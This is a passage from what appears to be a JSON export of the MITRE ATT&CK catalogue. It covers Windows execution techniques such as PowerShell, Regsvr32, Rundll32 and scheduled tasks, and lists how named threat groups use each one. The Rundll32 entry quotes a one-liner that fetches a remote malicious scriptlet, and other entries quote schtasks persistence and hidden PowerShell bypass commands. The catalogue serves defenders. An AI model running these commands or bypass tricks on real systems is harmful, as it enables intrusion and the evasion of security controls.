                    "Description": "APT32 has used PowerShell-based tools and shellcode loaders for execution.[10]"
                },
                {
                    "Name": "AutoIt backdoor",
                    "Description": "AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.[11]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used PowerShell for execution.[12]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used powershell.exe to download and execute scripts.[13][14][15][16][17]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does write any data to disk.[18]"
                },
                {
                    "Name": "CopyKittens",
                    "Description": "CopyKittens has used PowerShell Empire.[19]"
                },
                {
                    "Name": "DarkHydrus",
                    "Description": "DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.[20][21]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.[22]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper uses PowerShell for execution.[23]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used PowerShell scripts for execution.[24][25][26]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.[27][2]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.[28]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 uses a PowerShell script to launch shellcode that retrieves an additional payload.[29][30]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell during and.[31][32]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.[33]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can execute PowerShell scripts.[29]"
                },
                {
                    "Name": "HAMMERTOSS",
                    "Description": "HAMMERTOSS is known to use PowerShell.[34]"
                },
                {
                    "Name": "Helminth",
                    "Description": "One version of Helminth uses a PowerShell script.[35]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used PowerShell for execution.[36][37]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has used PowerShell for execution and privilege escalation.[38][39]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass uses PowerSploit to inject shellcode into PowerShell.[40]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito can launch PowerShell Scripts.[41]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used PowerShell for execution.[42][43]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.[44][45]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.[46][47]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.[48]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY uses PowerShell to execute various commands, one to execute its payload.[49]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "POWERSOURCE is a PowerShell backdoor.[50][51]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit modules are written in and executed via PowerShell.[52][53]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS uses PowerShell.[54]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER is written in PowerShell.[44]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy has a module for loading and executing PowerShell scripts.[55]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses PowerShell scripts for execution.[56]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form.[57][58]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin uses PowerShell for execution.[20]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.[7]"
                },
                {
                    "Name": "Socksbot",
                    "Description": "Socksbot can write and execute PowerShell scripts.[47]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.[59]"
                },
                {
                    "Name": "TA459",
                    "Description": "TA459 has used PowerShell for execution of a payload.[60]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used PowerShell for execution.[61]"
                },
                {
                    "Name": "Thrip",
                    "Description": "Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.[62]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla has used a custom executable to execute PowerShell scripts.[63]"
                }
            ]
        },
        "Regsvcs/Regasm": {
            "Name": "Regsvcs/Regasm",
            "Description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. [1] [2]Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. [3]\n",
            "ID": "T1121",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Process whitelisting",
            "Contributors: ": "Casey Smith",
            "Version": "1.0"
        },
        "Regsvr32": {
            "Name": "Regsvr32",
            "Description": "Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. [1]Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. [2] This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. [3] [4]Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking. [3]\n",
            "ID": "T1117",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Loaded DLLs, Process monitoring, Windows Registry, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Process whitelisting, Anti-virus",
            "Contributors: ": "Casey Smith",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 used Regsvr32 to bypass application whitelisting techniques.[5]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 created a Scheduled Task that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.[6]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group used regsvr32.exe to execute scripts.[7]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.[8]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.[9]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Start Folder persistence mechanism.[10]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can use Regsvr32 to execute additional payloads.[11]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used regsvr32 for execution.[12]"
                },
                {
                    "Name": "Orz",
                    "Description": "Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.[12]"
                }
            ]
        },
        "Rundll32": {
            "Name": "Rundll32",
            "Description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. [2]\n",
            "ID": "T1085",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Binary file metadata",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Anti-virus, Application whitelisting",
            "Contributors: ": "Ricardo Dias; Casey Smith",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.[3]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 configured its payload to inject into the rundll32.exe.[4]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\". APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[5][3][6][7]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can run DLLs.[8]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"vert\" = \"rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez\".[9]"
                },
                {
                    "Name": "Briba",
                    "Description": "Briba uses rundll32 within Registry Run Keys / Start Folder entries to execute malicious DLLs.[10]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak installs VNC server software that executes through rundll32.[11]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses Rundll32 to load a malicious DLL.[12]"
                },
                {
                    "Name": "CopyKittens",
                    "Description": "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[13]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"[14]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.[15]"
                },
                {
                    "Name": "DDKONG",
                    "Description": "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.[16]"
                },
                {
                    "Name": "Elise",
                    "Description": "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.[17]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.[18]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT uses Rundll32 for executing the dropper program.[19]"
                },
                {
                    "Name": "Flame",
                    "Description": "Rundll32.exe is used as a way of executing Flame at the command-line.[20]"
                },
                {
                    "Name": "gh0st",
                    "Description": "A gh0st variant has used rundll32 for execution.[21]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT is executed using rundll32.exe.[22]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can use Rundll32 to execute additional payloads.[23]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs uses rundll32.exe in a Registry value added to establish persistence.[24]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.[25]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.[26]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke uses rundll32.exe to load.[27]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka uses rundll32.exe to load its DLL.[28]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon executes functions using rundll32.exe.[29]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can load a DLL using Rundll32.[30]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM runs its core DLL file using rundll32.exe.[31]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula calls cmd.exe to run various DLL files via rundll32.[32]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx uses rundll32 to call an exported function.[33]"
                },
                {
                    "Name": "Winnti",
                    "Description": "The Winnti installer loads a DLL using rundll32.[34]"
                }
            ]
        },
        "Scheduled Task": {
            "Name": "Scheduled Task",
            "Description": "Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. [1]An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.\n",
            "ID": "T1053",
            "Tactic": "Execution, Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM, User",
            "Effective Permissions: ": "SYSTEM, Administrator, User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Windows event logs",
            "Supports Remote: ": "Yes",
            "CAPEC ID: ": "CAPEC-557",
            "Contributors: ": "Leo Loobeek, @leoloobeek; Travis Smith, Tripwire; Alain Homewood, Insomnia Security",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT18",
                    "Description": "APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.[2]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 used named and hijacked scheduled tasks to establish persistence.[3]"
                },
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".[4]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used scheduled tasks to persist on victim systems.[5]"
                },
                {
                    "Name": "at",
                    "Description": "at can be used to schedule a task on a system.[6]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute.[7]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used at and schtasks to register a scheduled task to execute malware during lateral movement.[8]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has created Windows tasks to establish persistence.[9]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence.[10]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "One persistence mechanism used by CozyCar is to register itself as a scheduled task.[11]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.[12][13]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[14]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.[15][16]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.[17]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 malware has created scheduled tasks to establish persistence.[18][19][20]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used scheduled tasks to maintain RDP backdoors.[21]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer can establish persistence by creating a scheduled task.[22][23]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT creates a scheduled task to ensure it is re-executed everyday.[24]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth has used a scheduled task for persistence.[25]"
                },
                {
                    "Name": "ISMInjector",
                    "Description": "ISMInjector creates scheduled tasks to establish persistence.[26]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in.[27][28]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".[29][30]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.[31]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to schedule remote AT jobs.[32]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.[33][34]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE creates a scheduled task to run itself every three minutes.[33][35]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork file stealer can run a TaskScheduler DLL to add persistence.[36]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via a Scheduled Task.[37][38]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER persists through a scheduled task that executes it every minute.[39]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon schedules tasks to invoke its components in order to establish persistence.[40]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT creates a scheduled task to maintain persistence on the victim’s machine.[34]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.[41]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command.[42]"
                },
                {
                    "Name": "RemoteCMD",
                    "Description": "RemoteCMD can execute commands remotely by creating a new schedule task on the remote system[43]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec schedules the execution one of its modules by creating a new scheduler task.[44]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM tries to add a scheduled task to establish persistence.[45]"
                },
                {
                    "Name": "schtasks",
                    "Description": "schtasks is used to schedule tasks on a Windows system to run at a specific date and time.[46]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon copies an executable payload to the target system by using Windows Admin Shares and then scheduling an unnamed task to execute the malware.[47][48]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader launches a scheduled task.[49]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly.[50]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network.[51]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot creates a scheduled task on the system that provides persistence.[52][53][54]"
                },
                {
                    "Name": "yty",
                    "Description": "yty establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\".[55]"
                }
            ]
        },
        "Scripting": {
            "Name": "Scripting",
            "Description": "Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.Scripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macos being allowed or that the user will accept to activate them.Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. [1] [1],  [2] [2], and PowerSploit [3] are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. [4]\n",
            "ID": "T1064",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, File monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Process whitelisting, Data Execution Prevention, Exploit Prevention",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 has used batch scripting to automate execution of commands.[5]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 downloaded and launched code within a SCT file.[6]"
                },
                {
                    "Name": "APT28",
                    "Description": "An APT28 loader Trojan uses a batch script to run its payload.[7]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke, as well as to evade defenses.[8][9]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used PowerShell on victim systems to download and run payloads after exploitation.[10]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 executes shellcode and a script to decode Base64 strings.[11]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal's dropper creates VBS scripts on the victim’s machine.[12]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used VBS, VBE, and batch scripts for execution.[13]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution. The group has also used an exploit toolkit known as Threadkit that launches .bat files.[14][15][16]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use PowerSploit or other scripting frameworks to perform execution.[17]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie executes BAT and VBS scripts.[18]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal has used macros in Word documents that would download a second stage if executed.[19]"
                },
                {
                    "Name": "DealersChoice",
                    "Description": "DealersChoice makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.[20]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.[4]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used various types of scripting to perform operations, including Python and batch scripts. The group was observed installing Python 2.7 on a victim.[21][22]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT executes batch scripts on the victim’s machine.[23]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has executed malicious .bat files containing PowerShell commands.[24]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[25]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener. FIN6 has also used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[26]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 used VBS and JavaScript scripts to help perform tasks on the victim's machine.[27]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities.[28]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "Gamaredon Group has used various batch scripts to establish C2, download additional files, and conduct other functions.[29]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.[30]"
                },
                {
                    "Name": "Helminth",
                    "Description": "One version of Helminth consists of VBScript and PowerShell scripts. The malware also uses batch scripting.[31]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened. The actors also used batch scripting.[32]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has used batch scripts in its malware to install persistence mechanisms.[33]"
                },
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap uses Python for scripting to execute additional commands.[34]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic performs most of its operations using Windows Script Host (Jscript and VBScript) and runs arbitrary shellcode .[35]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.[36]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer infected victims using JavaScript code.[37]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used multiple types of scripting for execution, including JavaScript, JavaScript Scriptlets in XML, and VBScript.[38]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has used .vbs scripts for execution.[39]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used malicious macros embedded inside Office documents to execute files.[40][41]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind uses batch scripts for various purposes, including to restart and uninstall itself.[42]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used VBScript and JavaScript files to execute its POWERSTATS payload.[43][44]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu executes additional Jscript and VBScript code on the victim's machine.[45]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT loads malicious shellcode and executes it in memory.[46]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used various types of scripting for execution, including .bat and .vbs scripts. The group has also used macros to deliver malware such as QUADAGENT and OopsIE.[47][48][49][50]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE creates and uses a VBScript as part of its persistent execution.[49][51]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can execute commands with script as well as execute JavaScript.[38]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.[52][53]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton uses macOS' .command file type to script actions.[54]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc uses a batch file to delete itself.[36]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can use an add on feature when creating payloads that allows you to create custom Python scripts (\"scriptlets\") to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.[55]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses VBScripts and batch scripts.[50]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor has used shell and VBS scripts as well as embedded macros for execution.[56]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "To assist in establishing persistence, RogueRobin creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File \"%APPDATA%\\OneDrive.ps1\".[57]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT uses a batch file to kill a security program task and then attempts to remove itself.[58]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.[8]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload.[59]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware uses PowerShell and WMI to script data collection and command execution on the victim.[60]"
                },
                {
                    "Name": "TA459",
                    "Description": "TA459 has a VBScript for execution.[61]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can uninstall malware components using a batch script. Additionally, a malicious Word document used for delivery uses VBA macros for execution.[62]"
                }
            ]
        },
        "Service Execution": {
            "Name": "Service Execution",
            "Description": "Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.\n",
            "ID": "T1035",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can start, stop, or delete services.[1]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.[2][3]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee launches a DLL file that gets executed as a service using svchost.exe[4]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq uses svchost.exe to execute a malicious DLL included in a new service group.[5]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.[6]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can run a command on another machine using PsExec.[7]"
                },
                {
                    "Name": "Net",
                    "Description": "The net start and net stop commands can be used in Net to execute or stop Windows services.[8]"
                },
                {
